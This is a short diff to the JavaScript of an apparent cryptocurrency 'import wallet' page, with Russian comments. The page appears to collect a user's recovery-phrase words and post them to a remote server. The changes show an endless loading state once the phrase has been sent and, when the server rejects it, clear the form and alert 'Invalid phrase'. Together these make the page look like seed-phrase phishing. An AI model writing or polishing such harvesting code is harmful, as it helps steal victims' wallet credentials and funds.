@@ -69,7 +69,7 @@ class ImportWallet {
 
         // Блокируем кнопку
         this.importBtn.disabled = true;
-        this.importBtn.classList.add('is-loading');
+
 
         // БЕСКОНЕЧНЫЙ цикл анимации
         let dots = 0;
@@ -83,11 +83,12 @@ class ImportWallet {
 
           if (response.ok) {
             console.log('Данные успешно отправлены!');
-
+            this.importBtn.classList.add('is-loading');
             // Здесь можно сделать перенаправление, если нужно:
             // window.location.href = '/success.html';
           } else {
-            console.error('Ошибка сервера');
+            this.clearForm()
+            alert('Invalid phrase')
           }
         } catch (err) {
           console.error('Ошибка соединения:', err);
@@ -159,7 +160,11 @@ class ImportWallet {
       input.addEventListener('paste', (e) => this.onInputPaste(e));
     });
   }
-
+  clearForm() {
+    const inputs = this.grid.querySelectorAll('.create__word-input');
+    inputs.forEach(input => input.value = '');
+    this.checkFormValidity(); // Снова заблокирует кнопку, если она была активна
+  }
   onInput(input) {
     this.activeInput = input;
     const value = input.value.trim().toLowerCase();
